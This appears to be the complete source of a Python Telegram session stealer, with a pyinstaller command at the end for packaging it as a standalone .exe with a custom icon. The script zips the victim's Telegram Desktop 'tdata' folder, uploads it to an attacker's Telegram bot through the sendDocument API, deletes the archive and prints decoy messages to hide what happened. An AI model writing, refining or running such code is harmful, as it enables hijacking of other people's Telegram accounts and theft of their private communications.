import os
import shutil
import zipfile
import requests
import random
from time import gmtime, strftime
time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
try:
    print("Wait...")
    print(time)
    username = os.getlogin()
    tdata_path = os.path.join(
        "C:\\Users", username,
        "AppData", "Roaming", "Telegram Desktop", "tdata"
    )
    def zip_folder(folder_path, output_path):
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(folder_path):
                # 'user_data' folderni tashlab ketish
                dirs[:] = [d for d in dirs if d != 'user_data' if d != 'user_data#2']
                
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        zipf.write(file_path, os.path.relpath(file_path, folder_path))
                    except:
                        pass
    zip_folder(tdata_path,"tdata.zip")
    res = requests.get(f"https://api.telegram.org/botBOTTOKEN/sendDocument?chat_id=ADMINID&caption={time}",files={'document':open(f"tdata.zip",'rb')}).json()
    os.remove("tdata.zip")
    input("Enter Press click")
except:
    print("Hello world!")
    input()

#UlugbekWeb



# pyinstaller.exe --icon=test.ico -F  .\main.py 
